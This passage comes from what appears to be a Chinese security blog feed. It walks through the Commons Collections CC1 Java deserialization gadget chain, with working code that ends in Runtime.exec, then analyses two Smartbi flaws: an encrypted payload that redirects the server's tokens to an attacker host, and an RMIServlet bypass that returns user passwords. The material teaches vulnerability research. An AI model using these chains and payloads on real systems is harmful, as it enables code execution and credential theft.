首先我们需要创建一个Map来进行装饰，给Map中放置任意的值。我们的目的是通过调用decorte从而去调用TransformedMap的构造方法再调用到他的ChecksetValue方法最后调用我们的触发点InvokerTransformer中的transform方法，可能有点多，但是梳理一下还是很简单的。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">正向理解：</span><br><span class="hljs-comment">    我把具体传值的调用执行情况正向写一下，因为我们一直是反向分析正向写出来大家可能会比较好理解：</span><br><span class="hljs-comment">    首先传入：</span><br><span class="hljs-comment">    Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, null, invokerTransformer);</span><br><span class="hljs-comment">    接下来会来到：</span><br><span class="hljs-comment">    public static decorate(HM,null,invokerTransformer)&#123;</span><br><span class="hljs-comment">        return new TransformedMap(HM,null,invokerTransformer);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    调用构造方法：</span><br><span class="hljs-comment">     protected TransformedMap(HM, null, invokerTransformer) &#123;</span><br><span class="hljs-comment">        super(HM);</span><br><span class="hljs-comment">        this.keyTransformer = null;</span><br><span class="hljs-comment">        this.valueTransformer = invokerTransformer;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    调用ChecksetValue：</span><br><span class="hljs-comment">        protected Object checkSetValue(runtime) &#123;</span><br><span class="hljs-comment">        return invokerTransformer.transform(runtime);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    这样看是不是瞬间就清晰很多</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>上面我们只是分析了<code>checkSetValue</code>的赋值情况，且这上述的三个方法是在同一个类当中的，并没有考虑到链条的问题，那么我们接下来再看链条问题，看一下谁调用了这个<code>checkSetValue</code>：</p><p><img src="https://ice.frostsky.com/2023/08/30/524d33fc9737884f9648f449aa3253c5.png" alt="image-20230830164444288"></p><p><img src="https://ice.frostsky.com/2023/08/30/942f6d0196dc0090e6a465784bdab6cd.png" alt="image-20230830164509435"></p><p>可以看到在<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>中的<code>setValue</code>调用了<code>checkSetValue</code>。</p><p>我们可以看到这里其实就是遍历Map的一个方法，但是想要触发<code>setValue</code>就必须遍历被装饰过的Map，也就是我们上面写的<code>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, null, invokerTransformer);</code>，既然来到了链条的下一部分，那么我们就需要反向写一下他的利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建一个HashMap</span><br>HashMap&lt;Object, Object&gt; HM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//添加到Map中</span><br>HM.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//调用装饰map       </span><br>Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(HM, <span class="hljs-literal">null</span>, invokerTransformer);<br><br><span class="hljs-comment">//遍历被修饰过的map</span><br><span class="hljs-keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<br>    entry.setValue(runtime);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">重点！！！！！   这里可能很多人已经乱了，没关系，我有解释，不要急看不懂多看几遍。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">解释：</span><br><span class="hljs-comment">    先解释一些这个增强佛如循环，在每次迭代时将transformedmap.entrySet()赋值给entry变量</span><br><span class="hljs-comment">    Map.Entry：Entry是Map接口中的内部接口，表示Map的一对键和值。</span><br><span class="hljs-comment">    entry：这是循环变量，用于遍历transformedmap中的条目</span><br><span class="hljs-comment">    transformedmap：是我们传入的Map对象</span><br><span class="hljs-comment">    entry.setValue(runtime)：是将当前的value设置为runtime对象。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    总结：目的是遍历transfirmedmap，并将value设置为runtime对象。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">正向理解调用链：</span><br><span class="hljs-comment">    首先我们调用Entry并传入transformedmap进行遍历：</span><br><span class="hljs-comment">        public Object setValue(runtime) &#123;</span><br><span class="hljs-comment">            value = transformedmap.checkSetValue(runtime);</span><br><span class="hljs-comment">            return entry.setValue(value);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    由于里面调用了transformedmap.checkSetValue：</span><br><span class="hljs-comment">        protected Object checkSetValue(runtime) &#123;</span><br><span class="hljs-comment">            return invokerTransformer.transform(runtime);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    最后会来到漏洞利用点：</span><br><span class="hljs-comment">    public Object transform(runtime) &#123;</span><br><span class="hljs-comment">        if (input == null) &#123;</span><br><span class="hljs-comment">            return null;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        try &#123;</span><br><span class="hljs-comment">            Class cls = runtime.getClass();</span><br><span class="hljs-comment">            Method method = cls.getMethod(“exec”, String.class);</span><br><span class="hljs-comment">            return method.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>所以接下来我们要找谁遍历了<code>transformedmap</code>且同时调用了<code>setValue</code>，因为只有在遍历<code>transformedmap</code>时调用<code>setValue</code>才能将<code>transformedmap</code>传入从而触发我们的利用链。或许你会问了，这样一直找得找到什么时候？而且找到哪里才算结束？</p><p>goodquestion！！！我们并不是无厘头的在找调用链，我们只是在找调用链的过程中去寻找谁使用了<code>readObject</code>方法（也就是我们的入口点）所以只有我们最终找到谁不仅在链上，而且还使用了readObject才会到达链条的终点。</p><p>那我们接着看谁遍历了<code>transformedmap</code>且调用了<code>setValue</code>：</p><p><img src="https://ice.frostsky.com/2023/08/30/c48d522b64e5a023f559a2c8c610e76e.png" alt="image-20230830193844202"></p><p><img src="https://ice.frostsky.com/2023/08/30/6a5b84b146f4990adb002e2d8ce587c1.png" alt="image-20230830194005308">这不是我们心心念念的终点吗！！！！（在readObject里遍历且调用了setValue)</p><p>这个类名很明显是动态代理过程中那个调用处理器类，老样子先看构造方法：</p><p><img src="https://ice.frostsky.com/2023/08/30/b60e0e5afc2ba16e9734c1a125b54470.png" alt="image-20230830194938669"></p><p>他接收两个参数，首先第一个<code>type</code>是一个继承了Annotation的Class，这个Annotation是注解，这个注解我的理解就是带@符号的类。第二个<code>memberValues</code>是一个Map，而且这个Map是我们可以完全控制的。那我们就可以把设计好的<code>transformedmap</code>传进去。</p><p>现实是美好的，在这之中还有几个小问题：</p><ol><li>这个<code>AnnotationInvocationHandler</code>的构造方法的权限修饰符是没写的，没写默认<code>default</code>所以这里需要反射调用。</li><li>我们看到在正式调用<code>setValue</code>之前还有两个if判断，所以我们需要进行绕过。</li><li>还有一个小问题就是我们没有办法直接传入Runtime这个对象，因为他是不允许反序列化的，但是Runtime.class是可以的，这个我们在之前第一步反射调用exec的时候已经处理过了，但是还需要注意。</li><li>我们注意到setValue的参数并不是我们想象中的那么完美</li></ol><p>所以我们需要解决上面这些问题才能真正的打通这条链，下面是解决问题的思路和代码：</p><p><strong>解决第一个问题：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第一个问题，反射调用</span><br><br>    <span class="hljs-comment">//因为是default，所以要通过全类名获取</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-comment">//获取构造方法</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>    <span class="hljs-comment">//确保获取</span><br>    annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">//传入参数</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);<br></code></pre></td></tr></table></figure><p>这里详细解释一下传入的两个参数，先说第二个吧，第二个参数是我们上面已经构造好的transformedmap。第一个参数呢，是我们上面提到的注解，这里贴张图吧，这里主要找带有参数的注解，方便我们解决第二个问题</p><p><img src="https://ice.frostsky.com/2023/08/30/3cd34b32dcc09e590808596299903a95.png" alt="3cd34b32dcc09e590808596299903a95"></p><p><strong>解决第二个问题</strong></p><p>两个if语句通过接收我们传入的第一个参数和我们Map中的key来进行判断，具体逻辑是：</p><p>第一个if判断传入key是否为空。</p><p>第二个if判断两个参数是否可以强转。</p><p>   <code>Object o = annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//member问题</span><br><br>       HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>       Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>       <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>       <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>       annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);<br></code></pre></td></tr></table></figure><p>因为我用的是@Target,我的map中key的值为value，他和@target中的参数是相同的都是value。所以两个if也解决了</p><p><strong>解决第三个问题</strong></p><p>其实第三个问题我们已经在刚开始都已经解决了，这里再提一下的原因是因为在他的方法中有一个可以遍历invokerTransformer，这样我们就不用像套娃一样的套了。</p><p><img src="https://ice.frostsky.com/2023/08/30/a9b36b4c876705e0decbe600d94d7d12.png" alt="image-20230830202922544"></p><p>他接收一个transformers的一个数组，然后递归调用整个数组，所以我们可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建transformers数组</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//传入transformers数组</span><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//调用chainedTransformer.transform(),其实总共这里我们控制的变量只有这个chainedTransformer.transform()中的参数值。</span><br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p><strong>解决第四个问题</strong></p><p><img src="https://ice.frostsky.com/2023/08/30/351a353442919b731c7c5b8cb509eba4.png" alt="image-20230830204207809"></p><p>我们先跟进一下setValue看看他内部到底是怎么样实现的：</p><p><img src="https://ice.frostsky.com/2023/08/30/d85b966c1a0bed2aebc59c1e3993b130.png" alt="image-20230830204258906"></p><p>看到这里有没有一种熟悉的赶脚，再次跟进：</p><p><img src="https://ice.frostsky.com/2023/08/30/ddbf790fb4a092a4d43ed4ac8ca6903b.png" alt="ddbf790fb4a092a4d43ed4ac8ca6903b"></p><p>我们发现他最后这里调用了我们传入的<code>chainedTransformer</code>，也就是我们第三个问题当中的<code>chainedTransformer</code>，我换一种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">其实这里的    valueTransformer.transform(value);  <br>就是我们     chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p>那么我们只需要保证给 <code>chainedTransformer.transform()</code>传入的参数是Runtime.class即可。</p><p>但是这里是</p><p>我们发现了一个非常有特点的函数就是ConstantTransformer.<code>transform</code>：</p><p><img src="https://ice.frostsky.com/2023/08/30/f567f26b5f7e704fb721b360b0c357f0.png" alt="d8e19b4e588f123c2e53107eb78ac1c6"></p><p>他的作用就是将<code>input</code>对象转换为一个值，并返回这个值。</p><p>虽然最后的那个点我们控制不了，但是如果我们通过<code>chainedTransformer.transform();</code>去调用他的<code>transform</code>那么我们也可以将整条链串起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//解释：</span><br><span class="hljs-comment">//这里可能有些人会乱，我知道你很乱，但是你先别乱，看完这段解释可能会帮助你理解</span><br><br><span class="hljs-comment">//首先我们跟进到readObject当中的setValue当中。</span><br><span class="hljs-comment">//我们发现实际最后实现的代码是：</span><br>valueTransformer.transform(value); <br><br><span class="hljs-comment">//但是这个valueTransformer.transform(value); 中的valueTransformer是我们的chainedTransformer，所以也就是说我们可以通过这个chainedTransformer去调用ConstantTransformer的transform，从而让ConstantTransformer的transform去获取Runtime.class，不就行了吗？之后就是一系列的串，看代码：</span><br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br><span class="hljs-comment">//看到这你会发现原来CC1是如此的简单</span><br></code></pre></td></tr></table></figure><h3 id="调用链："><a href="#调用链：" class="headerlink" title="调用链："></a>调用链：</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>   *<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>        *<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>至此，我们已经完整的理解了从TransformerMap入口的CC1链，后面我们再讲另外一条CC1吧，这篇文章已经写了两天了，说实话真的挺费神的。</p><p>大家一定要认真吃透CC1，只要CC1没问题了，其他几条CC都是排列组合，学起来非常轻松。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi那些事</title>
    <link href="/2023/08/28/Smartbi%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"/>
    <url>/2023/08/28/Smartbi%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Smartbi确实对于我在漏洞分析方面提供了很多思路和提升。要分析1day就得根据官方发布的补丁来“对症下药”，但是这个Smartbi的补丁是经过加密的，解包对于我一个菜鸡来说，还是有点顶。后来在师父提供的思路下，我通过学习还是搞了出来，首先在Smartbi的命令启动框会显示一些堆栈信息，在打了补丁之后，lib目录下的源码经过我diff之后发现没有一点变化，我用工具把Smartbi全局文件进行比较，发现只多了一个3k的ext文件。打开之后文件内容和我的大脑是一样的凌乱的。师父给了一种思路想，就是在打了补丁之后的程序中，去从内存中直接操作他的字节码，将补丁详细信息挖出来。后来我就学了类加载、学了javassist。终于在我的不懈努力下，将加密的ext给挖了出来。至于分析，很简单，难的是补丁解包。分析的话就跟着补丁走，找函数，看参数，跟就完了。经过Smartbi这一系列洞的分析，确实收获了不少的东西，希望后面自己可以多接触这种难题。</p><p>Smartbi的洞我都已经通过官方补丁复现和分析过了，只是有些能发有些发不了，后续要是能发我会第一时间分享出来。下面就先看两个洞，只是分析文章，并没有任何测试和攻击的payload，感兴趣的童鞋可以自己跟一下。</p><h1 id="SmartbiToken回调"><a href="#SmartbiToken回调" class="headerlink" title="SmartbiToken回调"></a>SmartbiToken回调</h1><p>根据官方补丁，发现对setAddress添加了规则所以我们主要找setAddress。</p><p><img src="https://ice.frostsky.com/2023/08/28/f2ee4f1cdee444c0b054746f2f5baca9.png" alt="image-20230828111158893"></p><p>通过查找我们找到了MonitorService.<code>setAddress</code>：</p><p><img src="https://ice.frostsky.com/2023/08/28/0e5699856d4f645929cb4a4fd5f8726a.md.png" alt="image-20230828111708299"></p><p>可以看到，这里先是创建对象，然后对对象解密，之后用获取对象中的json数据，其中key有：type、c_address、u_address之后会对type做判断是哪个类型就执行哪个操作。</p><p>所以我们要传入这个address的话，并不能之间以明文形式传入，我们在函数内部用<code>desEncode()</code>方法传入<code>key：isPassword</code>再对我们传入的数据：<code>&#123;&quot;type&quot;:&quot;experiment&quot;,&quot;c_address&quot;:&quot;http://10.65.182.92:9999&quot;,&quot;u_address&quot;:&quot;http://10.65.182.92:9999&quot;&#125;</code>进行加密得到结果为：<code>312E8684378EBDFF7E798B0BCCC45588EF682890F6F1701AF9D9416B4E357E80A1E8622D15B57E600944EC786F4E598DDE87CF4513277AC2EF3B38E69123E4B6C6BBDCDD5B6667AF74E81B278122E7F70E78A64F63A3D29BE2ADA07B0ADB17D88C825CA874F302FF</code></p><p>可以看到if分支中有两个方法：<code>setEngineAddress()</code>、<code>setServiceAddress</code>。且这里只能调用<code>setEngineAddress()</code>方法，因为再正式调用方法之前会提前进行判断，调用<code>setEngineAddress()</code>的两个参数serviceAddress和cAddress都是我们可以控制的，但是<code>setServiceAddress</code>我们是控制不了的因为他会只有一个参数我们能控制：cAddress另外一个参数serviceAddress是会从服务器端获取的。</p><p>看到这里我们再跟进一下<code>setEngineAddress()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/28/5267839a0cf5400885776b951d7c4dfe.png" alt="image-20230828113035113"></p><p>跟进updateSystemComfig：</p><p><img src="https://ice.frostsky.com/2023/08/28/f46f85d72b18bc7d9ca1d28802a75ced.png" alt="image-20230828134435604"></p><p>可以看到updateSystemConfig将我们传入的engineAddress进行了更新。</p><p>往下看发现了MonitorService.<code>getToken()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/28/61dabf4e5fd941ef22736e66dd6d2bea.png" alt="image-20230828135126274"></p><p>他通过接收type然后对type进行判断，从而将result以json格式发送到指定的引擎URL。</p><p>到这里我们也就清楚了漏洞的成因，到这并不是最危险的，最危险的是他竟然有一个用Token登录的方法：</p><p><img src="https://ice.frostsky.com/2023/08/28/292acecae4b845ab4a3057aa60691c4c.png" alt="image-20230828141439080"></p><p><img src="https://ice.frostsky.com/2023/08/28/f29be21157e28b7b642642f2cbd91fc8.png" alt="image-20230828135900929"></p><p>至此我们就把整个漏洞的利用过程也已经分析完。</p><p>其实还有一种利用方法就是直接调用<code>setEngineAddress</code>设置引擎地址：</p><p><img src="https://ice.frostsky.com/2023/08/28/2e5fa7dffaf6f4fc7680aae5bdd9adda.png" alt="image-20230828141802060"></p><p>这种方法比上面介绍的那种方法更简单一些，因为少了加密的步骤，可以直接将地址传入,之后就是和之前相同的流程了。</p><h1 id="Smartbi破解密码"><a href="#Smartbi破解密码" class="headerlink" title="Smartbi破解密码"></a>Smartbi破解密码</h1><p>官方补丁：</p><p><img src="https://ice.frostsky.com/2023/08/28/553d7176565f9cfe058998bbdc9dac82.png" alt="image-20230828143933047"></p><p>开始部分是判断请求路径是否以<code>&quot;/vision/RMIServlet&quot;</code>开始之后进入后续接收参数的流程。</p><p><img src="https://ice.frostsky.com/2023/08/28/069b41829dd9ea862cba0cc0b2931baf.png" alt="image-20230801160931962"></p><p>这里先用<code>windowUnloading</code>方式，传入我们之前在内置用户绕过漏洞中自定义的<code>RMICoder.encode</code>因为代码底层的encode和decode是不对称的。</p><p>之后我们会来到熟悉的<code>needToCheck()</code>方法：</p><p><img src="https://ice.frostsky.com/2023/08/28/c69c48c41002fd0ecfd240a132c6914f.png" alt="image-20230801161802797"></p><p><img src="https://ice.frostsky.com/2023/08/28/7edb4f5c06157005d92256c2699039c7.png" alt="image-20230801161412482"></p><p>这一步我们在之前讲过，这段代码的作用是对请求进行过滤和验证，以确保符合指定条件后才执行后续的操作。</p><p>因为我们发送的是POST请求，紧接着会进入<code>doPost()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/28/476c2fa26a5be58712b0e154d55359af.md.png" alt="image-20230801165716411"></p><p>在doPost中会对POST请求中传入的参数进行再次接收。</p><p>其实看到这里我们也就清楚了为什么既要用<code>windowUnloading</code>传参，还要用POST传参。</p><p>我们的目的是利用<code>windowUnloading</code>传入的参数去绕过<code>needToCheck()</code>中的检测，之后等程序顺利走到<code>doPost</code>中我们可以重新传入危险参数进行调用。</p><p>所以到这里我们就大概清楚了漏洞是如何产生的。下面我们具体分析一下每个参数的含义。</p><p><img src="https://ice.frostsky.com/2023/08/28/81b28fb7aeaa4a5195f4c9d1e159ddcd.md.png" alt="image-20230801172045204"></p><p>红色部分为className的利用过程。</p><p>首先<code>processExecute()</code>会接收我们传入的<code>className</code>、<code>methodName</code>、<code>params</code>。我们先来看<code>className</code>：</p><p>它通过<code>RMIModule.getInstance()</code>方法获取<code>RMIModule</code>的实例，然后调用其<code>getService(className)</code>方法来获取指定类名<code>（className）</code>对应的服务对象。只有最终的<code>service</code>不为null才能进入到后续的利用。</p><p><code>UserService</code>是一个用户服务类，用于管理用户、角色和用户组的信息。它提供了一系列方法来进行用户、角色和用户组的创建、更新、删除以及相关操作。</p><p>所以这里我们只能传入<code>UserService</code>；我试过白名单中其他类方法，但是没有可以成功利用的。</p><p>接下来我们来看其他两个变量<code>methondName</code>和<code>jsonParams</code>。在满足<code>service != null</code>的前提下，我们会进入到<code>service.execute()</code>而这个方法正好就接收我们传入的<code>methodName</code>和<code>jsonParams</code>。</p><p>那我们可以跟进一下：</p><p><img src="https://ice.frostsky.com/2023/08/28/a447def7cb46b3d7c7cd0f83d20cb67e.md.png" alt="image-20230802090138733"></p><p><img src="https://ice.frostsky.com/2023/08/28/37201375faab7231742ddbadbd0de3e6.md.png" alt="image-20230802090709454"></p><p>它通过反射机制获取方法对象，并根据参数的类型和个数进行校验和数据转换，最后调用<code>executeInternal</code>方法进行反射调用传入的变量<code>var3</code>方法中的<code>this.b</code>传入<code>var2</code>并返回执行结果</p><p>我们再进一步进行跟进：</p><p><img src="https://ice.frostsky.com/2023/08/28/78ac74312662f4599f43f2e2bec416ea.md.png" alt="image-20230802091659449"></p><p><img src="https://ice.frostsky.com/2023/08/28/8fed8cb0ffa6a406dc51b6ec55a5b5ff.png" alt="image-20230802092212469"></p><p>终于发现了漏洞触发点，而<code>getPassword</code>简单来说就是获取指定用户的密码。并返回查询结果，<code>params</code>就是我们需要查询密码的用户名。</p><p><img src="https://ice.frostsky.com/2023/08/28/90aea7da533adac5b022be5a4a04f4c6.png" alt="image-20230802092338015"></p><p>经过前面我们对前三个参数的分析我们已经大概清楚了漏洞利用流程。这时候你可能会问：你上面的POST数据可不止传入了三个参数。</p><p>其实最后一个参数的含义是为了让他能够不加密将结果返回到页面当中，我们看一下代码：</p><p><img src="https://ice.frostsky.com/2023/08/28/0bef977ad6ce603c65b8a7a66b5b4f7b.png" alt="image-20230802092849303"></p><p>这一步会从request中接收参数<code>jsonpCallback</code>并进行判断，若为空则对响应数据进行加密，若不为空则不加密。所以我们可以随意构造参数<code>jsonpCallback</code>保证回显到页面的数据是没有加密的。</p><p>当然黑客也可以选择上面的if分支，得到加密的返回数据后，自己对其进行解密。这样使得流量会更加隐蔽从而不容易被发现。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>没人比我更懂RMI(下)</title>
    <link href="/2023/08/26/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI3/"/>
    <url>/2023/08/26/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI3/</url>
    
